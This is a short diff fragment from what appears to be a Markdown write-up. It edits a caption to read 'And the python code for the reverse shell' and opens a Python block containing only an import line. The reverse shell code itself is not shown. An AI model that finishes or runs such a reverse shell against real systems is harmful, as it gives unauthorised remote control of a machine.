@@ -53,7 +53,7 @@ void loop() {
 }
 ```
 
-And the code for the reverse shell:
+And the python code for the reverse shell:
 
 ```python
 import os,socket,subprocess,threading;
